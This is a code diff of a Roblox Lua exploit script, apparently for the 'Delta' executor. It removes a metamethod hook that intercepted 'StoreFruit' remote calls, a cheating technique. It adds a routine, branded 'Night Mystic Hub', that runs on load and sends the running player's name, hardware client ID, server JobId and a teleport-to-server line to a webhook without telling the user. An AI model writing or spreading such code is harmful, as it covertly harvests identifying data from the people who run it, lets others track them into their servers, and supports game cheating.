@@ -236,35 +236,45 @@ end
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
+local TeleportService = game:GetService("TeleportService")
 local plr = Players.LocalPlayer
 local userId = plr.UserId
 
 -- avatar do player
 local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=420&height=420&format=png"
--- imagem fixa do bot (sua imagem roxa)
+-- imagem fixa do bot
 local botIcon = "https://i.imgur.com/Nk1a89M.jpeg"
 -- link do perfil do jogador
 local profileUrl = "https://www.roblox.com/users/"..userId.."/profile"
 
-local comm = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+-- simulando valores que aparecem no painel
+local executor = "Delta"
+local hardwareId = game:GetService("RbxAnalyticsService"):GetClientId()
+local currentSea = "Sea 3"
+local serverPlayers = #Players:GetPlayers() .. "/" .. tostring(Players.MaxPlayers)
+local jobId = game.JobId
+local teleportScript = ("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)")
+    :format(game.PlaceId, jobId)
 
-local function sendWebhook(fruta)
+local function sendWebhook()
     local data = {
-        ["username"] = "Fruit Finder NSHW",
-        ["avatar_url"] = botIcon, 
+        ["username"] = "Night Mystic Hub",
+        ["avatar_url"] = botIcon,
         ["embeds"] = {{
-            ["title"] = " Fruit Finder Notification 🕊️",
-            ["description"] = "Uma fruta foi armazenada no inventário!",
-            ["color"] = 139,
+            ["title"] = "[Night Mystic - Account Sync](https://discord.gg/nightmystic)", -- nome clicável
+            ["color"] = 3447003,
             ["thumbnail"] = {["url"] = avatarUrl},
             ["fields"] = {
-                {["name"] = "🧑 Jogador", ["value"] = "["..plr.Name.."]("..profileUrl..")", ["inline"] = true},
-                {["name"] = "🍇 Fruta", ["value"] = fruta or "Desconhecida", ["inline"] = true},
-                {["name"] = "🌍 PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true},
+                {["name"] = "🧑 Player", ["value"] = "["..plr.Name.."]("..profileUrl..")", ["inline"] = true},
+                {["name"] = "👤 Username", ["value"] = "@"..plr.Name, ["inline"] = true},
+                {["name"] = "🧩 Executor", ["value"] = executor, ["inline"] = true},
+                {["name"] = "🔑 Hardware ID", ["value"] = "```"..hardwareId.."```", ["inline"] = false},
+                {["name"] = "🌊 Current Sea", ["value"] = currentSea, ["inline"] = true},
+                {["name"] = "👥 Server Players", ["value"] = serverPlayers, ["inline"] = true},
+                {["name"] = "🆔 Job ID", ["value"] = "```"..jobId.."```", ["inline"] = false},
+                {["name"] = "📜 Teleport Script", ["value"] = "```lua\n"..teleportScript.."```", ["inline"] = false},
             },
-            ["footer"] = {["text"] = "Horário: " .. os.date("%d/%m/%Y %H:%M:%S"), ["icon_url"] = botIcon}
+            ["footer"] = {["text"] = "Last Sync • " .. os.date("%d/%m/%Y %H:%M:%S"), ["icon_url"] = botIcon}
         }}
     }
 
@@ -281,21 +291,5 @@ local function sendWebhook(fruta)
     end
 end
 
--- hook corrigido
-local old
-old = hookmetamethod(game, "__namecall", function(self, ...)
-    local args = {...}
-    local method = getnamecallmethod()
-    
-    if self == comm and method == "InvokeServer" and args[1] == "StoreFruit" then
-        local result = old(self, ...) -- pega o retorno do servidor
-        if result == true or result == "Sucess" then
-            sendWebhook(args[2]) -- só envia se armazenou mesmo
-        end
-        return result
-    end
-    
-    return old(self, ...)
-end)
-print("by araujo7xp")
-StartFruitFinder()
+sendWebhook()
+print("✅ Night Mystic Webhook enviado com sucesso!")
